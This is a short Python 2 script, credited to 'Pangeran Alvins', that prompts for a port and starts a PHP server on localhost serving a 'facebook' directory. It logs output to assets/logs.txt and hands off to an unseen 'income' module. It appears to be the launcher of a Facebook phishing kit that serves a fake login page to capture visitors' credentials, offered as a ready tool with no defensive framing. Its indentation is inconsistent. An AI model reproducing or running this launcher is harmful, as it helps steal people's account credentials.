#!/usr/bin/python
# coding=utf-8
#////Coded By : Pangeran Alvins
import os,sys,time,requests
import sys,time,os
import os
import json
import subprocess as cadow
import income
os.system('clear')
prred = ("\033[91m")
green = ("\033[92m")
pryellow = ("\033[93m")
prLightPurple=("\033[94m")
prCyan=("\033[96m")
prgray = ("\033[97m")
prBlack=("\033[98m")
p  = '\033[35m' # purple
c  = '\033[36m' # cyan
huh = '\033[32;1m'

cade = ("")
print
time.sleep(1)

    
 
 
def home():
  
  time.sleep(1)
  pp = raw_input(c+p+'           [#]Set Port : '+green+' ')
  print
  print
  if(pp==''):
   time.sleep(1)
   return home()
  else:
   print (c+p+'    [#]listning localhost port => '+green+'{}'.format(pp))
   while True:
    with open("assets/logs.txt","w") as cade:
			 cadow.Popen(
				["php","-S","localhost:{}".format(pp),"-t","facebook"],
				stderr=cadow.PIPE,stdin=cade,stdout=cade
			)
			 time.sleep(1)
			 income.home()